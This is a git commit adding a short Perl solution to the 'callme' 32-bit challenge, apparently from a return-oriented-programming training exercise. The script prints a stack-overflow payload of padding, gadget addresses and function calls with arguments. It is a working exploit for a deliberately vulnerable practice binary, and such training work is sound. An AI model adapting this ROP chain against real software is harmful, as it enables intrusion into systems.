1c5b6c1ea900c185e07edf14dc0f3e2ab6f156a2
cahu <cahu@nowhere.net>
2017-09-18 21:40:42 +0200

    callme 32

---
+++ callme/solution_32.pl
@@ -0,0 +1,12 @@
+$PADDING="B"x44;
+$CLEANUP="\xa9\x88\x04\x08"; # gadget pop;pop;pop;ret (cleanup stack)
+$CALLME1="\xc6\x85\x04\x08"; # pxw @ reloc.callme_one
+$CALLME2="\x26\x86\x04\x08"; # pxw @ reloc.callme_two
+$CALLME3="\xb6\x85\x04\x08"; # pxw @ reloc.callme_three
+$SETREGS="\1"."\0"x3 . "\2"."\0"x3 . "\3"."\0"x3;
+
+print $PADDING
+    . $CALLME1 . $CLEANUP . $SETREGS
+    . $CALLME2 . $CLEANUP . $SETREGS
+    . $CALLME3 . $CLEANUP . $SETREGS
+;
